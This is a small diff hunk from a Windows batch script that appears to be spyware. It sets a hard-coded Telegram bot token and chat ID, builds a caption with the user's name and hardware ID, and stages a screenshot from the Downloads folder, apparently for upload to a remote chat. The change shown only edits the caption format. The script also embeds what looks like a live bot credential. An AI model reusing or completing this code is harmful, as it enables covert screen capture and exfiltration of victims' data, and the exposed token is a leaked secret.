@@ -284,7 +284,7 @@ PowerShell -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -Asse
 :: Set bot token, chat ID, and caption
 set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
 set "CHAT_ID=-1002163721260"
-set "CAPTION=PC|%USERNAME%|%HWID%|STARTED|%MESSAGE%|"
+set "CAPTION=PC|%USERNAME%|%HWID%|STARTED|%MESSAGE%"
 set "PHOTO_PATH=%USERPROFILE%\Downloads\screenshot.png"
 
 :: URL encode the caption
